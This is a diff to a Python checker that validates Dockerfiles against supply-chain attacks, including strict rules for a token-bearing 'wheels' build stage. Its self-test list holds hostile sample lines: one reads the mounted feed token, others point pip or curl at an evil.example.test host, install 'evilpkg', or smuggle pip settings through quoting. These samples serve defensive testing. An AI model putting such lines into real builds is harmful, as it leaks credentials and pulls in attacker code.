@@ -31,6 +31,7 @@ context `broker/`:
 
 from __future__ import annotations
 
+import posixpath
 import re
 import shlex
 from dataclasses import dataclass
@@ -123,10 +124,22 @@ def parse_requirements(path: Path) -> list[tuple[int, str, str, list[str]]]:
     return pins
 
 
+OPCODES = frozenset({"FROM", "RUN", "COPY", "ARG", "ENV", "USER", "WORKDIR", "CMD", "ENTRYPOINT", "EXPOSE",
+                     "LABEL", "STOPSIGNAL", "HEALTHCHECK", "VOLUME"})
+
+
 def _instructions(path: Path):
-    """Yield (line, INSTRUCTION, args) with continuations joined as BuildKit does."""
+    """Yield (line, INSTRUCTION, args) with continuations joined as BuildKit does: the
+    keyword ends at any whitespace (BuildKit accepts tab, VT and FF there too). Control
+    characters other than tab, a heredoc, or an unknown keyword is an error, never a
+    skipped line (security review round 9)."""
+    text = path.read_text()
+    bad = next((c for c in text if (ord(c) < 32 and c not in "\t\n\r") or ord(c) == 127), None)
+    if bad is not None:
+        raise SupplyChainError(f"{rel(path)}: control character {bad!r} in a Dockerfile")
     buf, start = "", 0
-    for n, raw in enumerate(path.read_text().splitlines() + [""], 1):
+    for n, raw in enumerate(text.split("\n") + [""], 1):
+        raw = raw.rstrip("\r")
         if DIRECTIVE_RE.match(raw):
             raise SupplyChainError(f"{rel(path)}:{n}: parser directives are not allowed "
                                    "(`# syntax=` runs an unpinned BuildKit frontend)")
@@ -141,9 +154,14 @@ def _instructions(path: Path):
             buf += s[:-1] + " "
             continue
         buf += s
-        word, _, args = buf.partition(" ")
+        m = re.match(r"(\S+)\s*(.*)$", buf, re.S)
         buf = ""
-        yield start, word.upper(), args.strip()
+        word, args = m.group(1).upper(), m.group(2).strip()
+        if word not in OPCODES:
+            raise SupplyChainError(f"{rel(path)}:{start}: unknown or disallowed instruction {word[:20]!r}")
+        if word in ("RUN", "COPY") and "<<" in args:
+            raise SupplyChainError(f"{rel(path)}:{start}: heredocs are not allowed (they cannot be checked)")
+        yield start, word, args
 
 
 @dataclass
@@ -191,41 +209,100 @@ def _split_flags(args: str) -> tuple[list[str], str]:
     return flags, rest
 
 
+WHEELS_DIR = "/opt/pipfetch/"
+FETCH_SCRIPT_DEST = WHEELS_DIR + "pip-fetch.py"
+PIP_TOKEN_RE = re.compile(r"PIP_(?!SOURCE$)|pip\.conf|pydistutils", re.I)
+
+
+def _shell_tokens(text: str) -> list[str]:
+    try:
+        return shlex.split(text, posix=True)
+    except ValueError:
+        return [text]
+
+
 def scan_dockerfile(df: Path, image_refs: set[str]) -> tuple[list[Install], list[str]]:
-    """Installs found and errors (as `path:line: message`)."""
+    """Installs found and errors (as `path:line: message`).
+
+    A `wheels*` stage, the only place the CFS token is mounted, must be exactly:
+    FROM <pinned, registered image> AS wheels*; any of `ARG PIP_SOURCE`, `USER root`,
+    `COPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py`, `COPY <checked requirements
+    file> /opt/pipfetch/<its name>`; then, last and only, the fetch RUN. Nothing else can
+    run code before or beside the token (security review round 9).
+    An install RUN must directly follow the COPY of its requirements file, so nothing can
+    replace the file in between, and the canonical install must be its first command."""
     errors: list[str] = []
     installs: list[Install] = []
     stages: dict[str, str] = {}
     fetched: dict[str, set[Path]] = {}
-    stage_copies: dict[str, dict[str, Path | None]] = {}
-    copies: dict[str, Path | None] = {}
-    base, stage = "", None
+    stage_copies: dict[str, dict[str, Path | str | None]] = {}
+    copies: dict[str, Path | str | None] = {}
+    base, stage, wheels, wheels_done, prev = "", None, False, False, ("", "")
     loc = rel(df)
     try:
         instrs = list(_instructions(df))
     except SupplyChainError as e:
         return [], [str(e)]
+
+    def err(n: int, msg: str) -> None:
+        errors.append(f"{loc}:{n}: {msg}")
+
     for n, op, args in instrs:
-        if PIP_CONFIG_RE.search(args):
-            errors.append(f"{loc}:{n}: pip configuration in a Dockerfile is not allowed")
-        if op in ("ADD", "ONBUILD"):
-            errors.append(f"{loc}:{n}: {op} is not allowed (use COPY from the build context)")
-        elif op == "FROM":
+        if PIP_CONFIG_RE.search(args) or (op in ("ENV", "ARG", "RUN", "COPY")
+                                          and any(PIP_TOKEN_RE.search(t) for t in _shell_tokens(args))):
+            err(n, "pip configuration in a Dockerfile is not allowed")
+        if wheels and op != "FROM":
+            if wheels_done:
+                err(n, "nothing may follow the fetch RUN in a wheels stage")
+            elif op == "ARG" and args == "PIP_SOURCE" or op == "USER" and args == "root":
+                pass
+            elif op == "COPY":
+                parts = args.split()
+                ok = len(parts) == 2 and (
+                    (parts == ["tools/pip-fetch.py", FETCH_SCRIPT_DEST])
+                    or (isinstance(_resolve_copy_src(df, parts[0]), Path)
+                        and parts[1] == WHEELS_DIR + Path(parts[0]).name))
+                if not ok:
+                    err(n, "a wheels stage may only COPY tools/pip-fetch.py and requirements files to "
+                           "/opt/pipfetch/<same name>")
+                else:
+                    copies[parts[1]] = "script" if parts[1] == FETCH_SCRIPT_DEST else _resolve_copy_src(df, parts[0])
+            elif op == "RUN":
+                flags, script = _split_flags(args)
+                tokens = _shell_tokens(script)
+                if (flags != FETCH_FLAGS or len(tokens) != 4 or tokens[:3] != ["python3", "-I", FETCH_SCRIPT_DEST]
+                        or copies.get(FETCH_SCRIPT_DEST) != "script" or not isinstance(copies.get(tokens[3]), Path)
+                        or any(c in script for c in ";&|`$()<>\n")):
+                    err(n, "the only RUN in a wheels stage is exactly `" + " ".join(FETCH_FLAGS)
+                        + f" python3 -I {FETCH_SCRIPT_DEST} <COPY of a requirements file>`")
+                else:
+                    fetched.setdefault(stage, set()).add(copies[tokens[3]])
+                    wheels_done = True
+            else:
+                err(n, f"{op} is not allowed in a wheels stage")
+            prev = (op, args)
+            continue
+        if op == "FROM":
             m = FROM_RE.match(args)
             if not m:
-                errors.append(f"{loc}:{n}: unparsed FROM {args!r}")
+                err(n, f"unparsed FROM {args!r}")
                 continue
             image, alias = m.group(1), m.group(2)
             if image.lower() in stages:
+                if image.lower().startswith("wheels"):
+                    err(n, "a stage may not build on a wheels stage")
                 base = stages[image.lower()]
                 copies = dict(stage_copies.get(image.lower(), {}))
             else:
                 base, copies = image, {}
                 if not PINNED_RE.match(image):
-                    errors.append(f"{loc}:{n}: base image {image!r} is not pinned by digest")
+                    err(n, f"base image {image!r} is not pinned by digest")
                 elif image not in image_refs:
-                    errors.append(f"{loc}:{n}: base image {image!r} is not in broker/deps.json")
+                    err(n, f"base image {image!r} is not in broker/deps.json")
             stage = alias.lower() if alias else None
+            wheels, wheels_done = bool(stage and stage.startswith("wheels")), False
+            if wheels and image.lower() in stages:
+                err(n, "a wheels stage must start from a pinned image, not another stage")
             if stage:
                 stages[stage] = base
                 stage_copies[stage] = copies
@@ -235,55 +312,54 @@ def scan_dockerfile(df: Path, image_refs: set[str]) -> tuple[list[Install], list
             rest = [p for p in parts if not p.startswith("--")]
             for f in flags:
                 if f.lower().startswith("--from=") and f.split("=", 1)[1].lower() not in stages:
-                    errors.append(f"{loc}:{n}: COPY {f} must name an earlier build stage")
-            if not any(f.lower().startswith("--from=") for f in flags) and len(rest) == 2:
-                copies[rest[1]] = _resolve_copy_src(df, rest[0]) or (
-                    "script" if _resolve_copy_src(df, rest[0], script=True) else None)
+                    err(n, f"COPY {f} must name an earlier build stage")
+            for dest in list(copies):
+                if rest and (dest == rest[-1] or dest.startswith(rest[-1].rstrip("/") + "/")
+                             or posixpath.normpath(rest[-1]) == posixpath.normpath(dest)):
+                    copies.pop(dest)  # anything a later COPY may overwrite is no longer tracked
+            if not flags and len(rest) == 2 and posixpath.normpath(rest[1]) == rest[1]:
+                copies[rest[1]] = _resolve_copy_src(df, rest[0])
         elif op == "RUN":
             if args.startswith("["):
-                errors.append(f"{loc}:{n}: exec-form RUN is not allowed (it cannot be checked)")
+                err(n, "exec-form RUN is not allowed (it cannot be checked)")
+                prev = (op, args)
                 continue
             flags, script = _split_flags(args)
             try:
                 cmds = _commands(script)
             except ValueError as e:
-                errors.append(f"{loc}:{n}: cannot parse RUN: {e}")
+                err(n, f"cannot parse RUN: {e}")
+                prev = (op, args)
                 continue
             if flags == FETCH_FLAGS:
-                cmd = cmds[0] if len(cmds) == 1 else []
-                ok = (len(cmd) == 3 and cmd[0] == "python3" and copies.get(cmd[1]) == "script"
-                      and isinstance(copies.get(cmd[2]), Path) and stage is not None)
-                if not ok:
-                    errors.append(f"{loc}:{n}: the secret-mount RUN must be exactly `python3 <COPY of "
-                                  "tools/pip-fetch.py> <COPY of a requirements file>`, alone, in a named stage")
-                else:
-                    fetched.setdefault(stage, set()).add(copies[cmd[2]])
+                err(n, "the secret mount is only allowed in a wheels stage")
+                prev = (op, args)
                 continue
             bind = BIND_RE.match(flags[0]) if len(flags) == 1 else None
             if flags and bind is None:
-                errors.append(f"{loc}:{n}: RUN flags are allowed only in the wheels fetch and install forms")
-                continue
-            for cmd in cmds:
-                while cmd and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", cmd[0]):
-                    cmd = cmd[1:]
+                err(n, "RUN flags are allowed only in the wheels fetch and install forms")
+            for i, cmd in enumerate(cmds):
                 if cmd[:-1] == CANONICAL:
                     target = copies.get(cmd[-1])
                     src = bind.group(1).lower() if bind else None
-                    if not isinstance(target, Path):
-                        errors.append(f"{loc}:{n}: -r {cmd[-1]} is not the destination of a COPY of one "
-                                      "checked requirements*.txt file")
+                    copied_now = prev[0] == "COPY" and prev[1].split()[-1:] == [cmd[-1]]
+                    if i != 0 or not copied_now:
+                        err(n, "the install must be the first command of the RUN directly after the COPY of "
+                               "its requirements file")
+                    elif not isinstance(target, Path):
+                        err(n, f"-r {cmd[-1]} is not the destination of a COPY of one checked requirements*.txt file")
                     elif src is None or src not in stages or target not in fetched.get(src, set()):
-                        errors.append(f"{loc}:{n}: install must bind /wheels from an earlier stage that "
-                                      f"fetched {rel(target)}")
+                        err(n, f"install must bind /wheels from an earlier stage that fetched {rel(target)}")
                     elif stages[src] != base:
-                        errors.append(f"{loc}:{n}: wheels stage {src} has a different base image")
+                        err(n, f"wheels stage {src} has a different base image")
                     else:
                         installs.append(Install(df, n, target, base))
                 elif any(INSTALLER_RE.search(t) for t in cmd):
-                    errors.append(f"{loc}:{n}: Python package install must be exactly "
-                                  f"`{' '.join(CANONICAL)} <path>`: {' '.join(cmd)[:120]!r}")
-            if bind is not None and not any(c[:-1] == CANONICAL for c in cmds):
-                errors.append(f"{loc}:{n}: a wheels bind mount is only for the canonical install")
+                    err(n, f"Python package install must be exactly `{' '.join(CANONICAL)} <path>`: "
+                           f"{' '.join(cmd)[:120]!r}")
+            if bind is not None and not (cmds and cmds[0][:-1] == CANONICAL):
+                err(n, "a wheels bind mount is only for the canonical install")
+        prev = (op, args)
     return installs, errors
 
 
@@ -346,13 +422,41 @@ def self_test() -> list[str]:
     canon = " ".join(CANONICAL)
     fetch = " ".join(FETCH_FLAGS)
     bind = "--mount=type=bind,from=wheels,source=/wheels,target=/opt/wheels"
-    wheels = (f"FROM {ref} AS wheels\nARG PIP_SOURCE\nCOPY tools/pip-fetch.py /f.py\nCOPY requirements.txt /w.txt\n"
-              f"RUN {fetch} python3 /f.py /w.txt\n")
+    wheels = (f"FROM {ref} AS wheels\nARG PIP_SOURCE\nUSER root\nCOPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py\n"
+              f"COPY requirements.txt /opt/pipfetch/requirements.txt\n"
+              f"RUN {fetch} python3 -I /opt/pipfetch/pip-fetch.py /opt/pipfetch/requirements.txt\n")
     head = wheels + f"FROM {ref} AS base\nCOPY requirements.txt /r.txt\n"
     install = f"RUN {bind} {canon} /r.txt"
+    wheels_hook = wheels.replace("USER root\n", "ENV PYTHONPATH=/opt/hook\nRUN mkdir -p /opt/hook\n")
     df_bad = [
         "# syntax=docker/dockerfile:1\n" + head + install,
         "#escape=`\n" + head,
+        # Review round 9: BuildKit ends the keyword at any whitespace; so must the gate.
+        head + install + "\nRUN\t--mount=type=secret,id=cfs_feed_token,required=false sh -c 'cat /run/secrets/cfs_feed_token'",
+        head + install + "\nENV\tPIP_INDEX_URL=https://evil.example.test/simple",
+        head + install + "\nFROM\tpython:latest",
+        head + install + "\nRUN\x0bpip install evilpkg",
+        head + install + "\nRUN\x0cpip install evilpkg",
+        head + install + "\nRUN <<EOF\npip install evilpkg\nEOF",
+        head + install + "\nSHELL [\"python3\", \"-c\"]",
+        head + install + "\nMAINTAINER x",
+        # Review round 9: nothing else runs in a wheels stage, beside or before the token.
+        wheels_hook + f"FROM {ref} AS base\nCOPY requirements.txt /r.txt\n" + install,
+        wheels.replace("USER root\n", "RUN cp /bin/true /opt/pipfetch/pip-fetch.py\n") + f"FROM {ref} AS base\n",
+        wheels.replace("COPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py\n",
+                       "COPY tools/pip-fetch.py /opt/pipfetch/pip-fetch.py\nCOPY tools/pin_check.py /opt/pipfetch//pip-fetch.py\n")
+        + f"FROM {ref} AS base\n",
+        wheels.replace("python3 -I", "python3") + f"FROM {ref} AS base\n",
+        wheels + "RUN true\n" + f"FROM {ref} AS base\n",
+        wheels + f"FROM wheels AS base\nCOPY requirements.txt /r.txt\n" + install,
+        f"FROM {ref} AS base\nRUN {fetch} python3 -I /opt/pipfetch/pip-fetch.py /opt/pipfetch/requirements.txt\n",
+        # Review round 9: the checked file must be the installed file.
+        head + "RUN cp /etc/hostname /r.txt\n" + install,
+        head + "COPY requirements-test.txt /r.txt\n" + install.replace("/r.txt", "/x.txt"),
+        head + "COPY requirements-test.txt /./r.txt\n" + install,
+        head + f"RUN {bind} true && {canon} /r.txt",
+        head + f"RUN {bind} export P\"IP_\"REQUIREMENT=/e.txt && {canon} /r.txt",
+        head + f"RUN {bind} PIP_REQUIREMENT=/e.txt {canon} /r.txt",
         head + "ADD https://evil.example.test/x /x",
         head + f"COPY --from=other@sha256:{h} /x /x",
         head + f"RUN --mount=type=bind,from=other@sha256:{h},target=/m true",
@@ -368,7 +472,8 @@ def self_test() -> list[str]:
         head + "COPY requirements-test.txt /t.txt\n" + f"RUN {bind} {canon} /t.txt",
         head.replace(f"FROM {ref} AS base", f"FROM {ref2} AS base") + install,
         head.replace("required=false", "required=true") + install,
-        head.replace("python3 /f.py /w.txt", "python3 /f.py /w.txt && curl https://evil.example.test/") + install,
+        head.replace("pip-fetch.py /opt/pipfetch/requirements.txt\n",
+                     "pip-fetch.py /opt/pipfetch/requirements.txt && curl https://evil.example.test/\n") + install,
         head.replace("COPY tools/pip-fetch.py", "COPY tools/pin_check.py") + install,
         head.replace(f"FROM {ref} AS wheels", f"FROM {ref}") + install,
         head + "RUN uv pip install pkg",
